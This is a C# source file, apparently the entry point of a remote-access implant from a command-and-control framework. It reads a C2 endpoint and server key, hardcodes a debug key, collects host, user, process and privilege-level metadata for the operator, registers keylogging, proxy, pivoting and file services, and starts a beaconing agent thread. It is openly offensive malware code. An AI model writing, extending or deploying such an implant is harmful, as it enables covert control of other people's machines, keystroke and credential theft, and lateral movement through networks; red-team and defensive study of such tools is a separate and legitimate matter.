using Agent.Communication;
using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

#if SERVICE
using System.ServiceProcess;
#endif

namespace Agent
{
    public class Entry
    {
#if DEBUG
        static string[] _args = new string[0];
#endif

        public static void Main(string[] args)
        {
#if DEBUG
            _args = args;
            Start();
#endif
        }



        static Thread s_agentThread = null;

        public static void Start()
        {
            string connUrl = Properties.Resources.EndPoint;
            string serverKey = Properties.Resources.Key;
#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));

            if (_args.Count() > 0)
            {
                connUrl = _args[0];
                
            }

            if (_args.Count() > 1)
            {
                serverKey = _args[1];
            }
            else
            {
                serverKey = "1yOdEVXef7ljnzrRgINB27Bi4zGwi1v2B664b65hAO7elTTM";
            }

            //connUrl = "https://192.168.174.128";

#endif
            var connexion = ConnexionUrl.FromString(connUrl);

            Debug.WriteLine($"Endpoint is {connUrl}.");
            Debug.WriteLine($"ServerKey is {serverKey}.");

            if (!connexion.IsValid)
            {
                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiting...");
                return;
            }

            var metaData = GenerateMetadata(connexion.ToString());


            var configService = new ConfigService();
            configService.ServerKey = serverKey;

            ServiceProvider.RegisterSingleton<IConfigService>(configService);
            ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
            ServiceProvider.RegisterSingleton<IFileService>(new FileService());
            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());

            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
            ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());

            


            var commModule = CommunicationFactory.CreateCommunicator(connexion);
            var agent = new Models.Agent(metaData, commModule);

            s_agentThread = new Thread(agent.Start);
            s_agentThread.Start();
            s_agentThread.Join();
        }

        private static void Stop()
        {
            // onstop code here
            s_agentThread.Abort();
        }


        static AgentMetadata GenerateMetadata(string endpoint)
        {
            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            string integrity = "Medium";
            if (userName == "SYSTEM")
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            AgentMetadata metadata = new AgentMetadata()
            {
                Id = ShortGuid.NewGuid(),
                Hostname = Environment.MachineName,
                UserName = userName,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                Integrity = integrity,
                EndPoint = endpoint,
                Version = "Net v2.6.0",
                SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                SleepJitter = 0
            };

            return metadata;
        }
    }
}
